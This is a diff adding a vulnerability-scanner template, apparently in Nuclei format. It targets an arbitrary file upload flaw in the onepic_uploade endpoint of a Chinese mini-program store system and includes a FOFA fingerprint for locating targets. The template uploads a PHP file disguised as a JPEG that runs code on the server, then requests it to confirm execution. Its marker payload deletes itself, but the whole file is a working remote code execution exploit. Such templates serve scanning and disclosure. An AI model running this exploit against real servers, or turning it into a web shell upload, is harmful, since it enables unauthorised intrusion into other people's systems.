@@ -1,0 +1,64 @@
+id: poc-yaml-internet-wxapps-onepic-uploade-anyfile-upload
+info:
+  name: "万能门店小程序系统 onepic_uploade 任意文件上传漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    finger: "全行业小程序运营系统"
+    fofa: "/comhome/cases/index.html"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/comadmin/Remote/onepic_uploade?file=file"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz"
+    body: |-
+      ------WebKitFormBoundaryBiKyL9D0p5OtH5zz
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".php"
+          - "upimages"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "(?P<file>[0-9a-z]{32,35}).php"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/upimages/{{dt1}}{{dt2}}{{dt3}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
